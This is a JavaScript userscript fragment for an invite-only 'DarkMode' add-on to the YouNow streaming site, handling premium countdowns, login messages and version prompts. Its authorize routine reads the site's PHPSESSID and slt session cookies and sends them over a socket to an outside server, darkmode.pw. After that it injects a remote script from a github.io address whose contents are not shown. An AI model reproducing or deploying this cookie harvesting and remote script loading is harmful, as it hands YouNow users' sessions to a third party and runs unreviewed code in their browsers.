 /*       window.statusChangeStatus("Server is moving :)");
        setTimeout(function(){window.statusHide();}, 2000);
        var el = document.createElement("div");
        el.id = "update";
        el.innerHTML = "<h2>Oh!</h2><p>The server is moving its location! Please be patient. The dark mode should be back up in about 2 hours. (7PM GMT)</p>";
        document.body.appendChild(el);
        return;*/
        //premium
	setInterval(function(){
		if (window.darkMode == null) window.darkMode = {};

		var expire = window.darkMode.premiumExpire;
		if (expire != null)
		{
			var timestamp = (new Date().getTime() / 1000) + window.darkMode.timestampDiff;
			var diff = expire - timestamp;
			if (diff > 0)
			{
				window.darkMode.isPremium = true;
				var seconds = Math.floor(diff % 60);
				var minutes = Math.floor((diff / 60) % 60);
				var hours = Math.floor((diff / 3600) % 24);
				var days = Math.floor(diff / (3600 * 24));
				window.darkMode.timeLeft = diff;
				window.darkMode.timeLeftString = days+"d "+hours+"h "+minutes+"m "+seconds+"s";
			}
			else
			{
				window.darkMode.isPremium = false;
			}
		}
	}, 1000);

	var scriptAdded = false;

	window.dmSocket = io.connect("https://darkmode.pw:8080", {secure: true});
	window.dmSocket.on('auth', function(data)
	{
		if (data["status"] == "Not authorized!")
		{
			var ts = new Date().getTime() / 1000;
			if (window.darkMode == null) window.darkMode = {};
			if (data["userID"] != null)
				window.darkMode.userID = data["userID"];
			if (data["sessionID"] != null)
				window.darkMode.sessionID = data["sessionID"];
			if (data["timestamp"] != null)
			{
				window.darkMode.timestamp = data["timestamp"];
				window.darkMode.timestampDiff = data["timestamp"] - ts;
			}
			if (data["role"] != null)
				window.darkMode.role = data["role"];
			if (data["premiumExpire"] != null)
				window.darkMode.premiumExpire = data["premiumExpire"];

			window.localStorage.setItem('sessID', window.darkMode.sessionID);
			window.statusChangeStatus("Authorized!");
			window.hideModal();
			setTimeout(function(){window.statusHide();}, 2000);
			if (!scriptAdded)
			{
				var s = document.createElement("script");
				s.src = "https://Watch-Your.Back.github.io/build.min.js?rand="+Math.random();
				head.appendChild(s);
				scriptAdded = true;
			}
		}
		else
		{
			window.statusChangeStatus("authorized");
			setTimeout(function(){window.statusHide();}, 2000);
			var el = document.createElement("div");
			el.id = "update";
			el.innerHTML = "<h2>Nope!</h2><p>You're <strong>NOT</strong> invited to the Dark Mode."+
			"<br />This may be because of one of the following reasons:"+
			"<br /><ul><li>You are not logged in to your invited account on YouNow.</li>"+
			"<li>You are simply not invited.</li>"+
			"<li>You are a traitor and have been removed from the DarkMode.</li>"+
			"</ul><br />If you think this is an error please contact Souldrinker on the following TeamSpeak:<br />"+
			"<strong>souldrinker.de</strong>"+
			"<br /><br />Best regards,<br>SOULDR!NKER</p><img style=\"margin-bottom:-20px;\" src=\"http://i.imgur.com/eq5BG77.png\">";
			document.body.appendChild(el);
		}
	});

	window.dmSocket.on('connect', function() {
		window.statusChangeStatus("Authorizing...");
		authorize();
	});

	var authorize = function()
	{
		var PHPSESSID = window.readCookie('PHPSESSID');
		var slt = window.readCookie('slt');
		var sessID = window.localStorage.getItem('sessID');
		if (slt == null) slt = "";
		if (PHPSESSID == null) PHPSESSID = "";
		if (sessID == null) sessID = "";
		window.dmSocket.emit("login", {'PHPSESSID':PHPSESSID,'slt':slt,'sessionID':sessID});
	};

	window.dmSocket.on('reconnecting', function() {
		window.statusChangeStatus("Connection lost");
		window.statusShow();
		window.showModal();
	});

	window.dmSocket.on('err', function(data) {
		window.statusChangeStatus(data["message"]);
		window.statusShow();
		window.showModal();
	});

	window.dmSocket.on('reauth', function(data) {
		window.statusChangeStatus(data["message"]);
		window.statusShow();
		window.showModal();
		authorize();
	});

	if (window.darkMode.version != "3.0")
	{
		var el = document.createElement("div");
		el.id = "update";
		el.innerHTML = "<h2>Awesome!</h2><p>You're using the DarkMode! <br>Thanks for that. Unfortunately your version is a little outdated. <br><strong>But that's no problem at all!</strong><br>Just reinstall the script from the following location and you're good to go!<br><br><a href=\"https://fluffyfishgames.github.io/DarkMode.2.0.beta.user.js\">https://fluffyfishgames.github.io/DarkMode.2.0.beta.user.js</a><br><br>Sincerely,<br>SOULDR!NKER</p><img src=\"https://lh3.googleusercontent.com/-J0DBZHrYkGA/UoJsytwH7rI/AAAAAAAC_a4/CGvUdJz9Mcg/w640-h400-p-k/Vault_Boy.png\">";
		document.body.appendChild(el);
	}
	/*
	var flames = document.createElement("div");
	flames.id = "flames";
	var dancingLeft = document.createElement("div");
	dancingLeft.className = "dancing left";
	var dancingRight = document.createElement("div");
	dancingRight.className = "dancing right";

	document.body.appendChild(flames);
	document.body.appendChild(dancingLeft);
	document.body.appendChild(dancingRight);*/